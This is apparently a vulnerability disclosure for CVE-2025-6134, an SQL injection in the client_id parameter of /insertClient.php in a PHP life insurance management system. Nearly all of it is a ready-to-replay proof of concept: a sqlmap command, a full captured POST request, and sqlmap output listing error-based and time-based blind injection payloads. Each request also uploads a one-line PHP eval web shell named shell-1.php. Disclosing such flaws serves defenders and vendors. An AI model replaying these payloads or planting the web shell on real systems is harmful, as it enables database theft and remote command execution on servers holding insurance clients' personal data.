# CVE-2025-6134

SQLi vulnerability in Life Insurance Management System v1.0 of file /insertClient.php with param 'client_id'

**vender**:

- projectworlds

**SoftLink**:

- [Life Insurance Management System in PHP | Projectworlds](https://projectworlds.in/life-insurance-management-system-in-php/)

**Vulnerable File**

- /insertClient.php

**Version**

- V1.0

### POC

```bash
sqlmap -r request.txt --level 5 --batch
```



```http
POST /insertClient.php HTTP/1.1
Host: www.lims.top
Priority: u=0, i
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://www.lims.top/addclient.php
Cookie: PHPSESSID=sqvuccn7rsiqr9bhq7p29tfds2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----geckoformboundary89848bfa335165075bab4c1b690d9cfb
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Origin: http://www.lims.top
Content-Length: 2416

------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="client_id"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="client_password"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="name"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="fileToUpload"; filename="shell-1.php"
Content-Type: application/octet-stream

<?php @eval($_POST["cmd"]);?>
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="sex"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="birth_date"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="maritial_status"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nid"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="phone"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="address"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="policy_id"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="agent_id"

555
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_id"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_name"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_sex"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_birth_date"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_nid"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_relationship"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="priority"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_phone"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb--
```





### POC

```bash
sqlmap -r request.txt --level 5 --batch
```



```
---
Parameter: MULTIPART client_id ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: ------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="client_id"

5' AND GTID_SUBSET(CONCAT(0x716b787871,(SELECT (ELT(3370=3370,1))),0x7178787671),3370) AND 'Tjkd'='Tjkd
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="client_password"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="name"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="fileToUpload"; filename="shell-1.php"
Content-Type: application/octet-stream

<?php @eval($_POST["cmd"]);?>
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="sex"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="birth_date"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="maritial_status"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nid"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="phone"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="address"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="policy_id"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="agent_id"

555
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_id"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_name"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_sex"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_birth_date"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_nid"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_relationship"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="priority"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_phone"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="client_id"

5' AND (SELECT 8463 FROM (SELECT(SLEEP(5)))fhaL) AND 'gTRd'='gTRd
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="client_password"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="name"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="fileToUpload"; filename="shell-1.php"
Content-Type: application/octet-stream

<?php @eval($_POST["cmd"]);?>
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="sex"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="birth_date"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="maritial_status"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nid"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="phone"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="address"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="policy_id"

5
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="agent_id"

555
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_id"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_name"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_sex"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_birth_date"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_nid"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_relationship"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="priority"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb
Content-Disposition: form-data; name="nominee_phone"

6
------geckoformboundary89848bfa335165075bab4c1b690d9cfb--
---
```

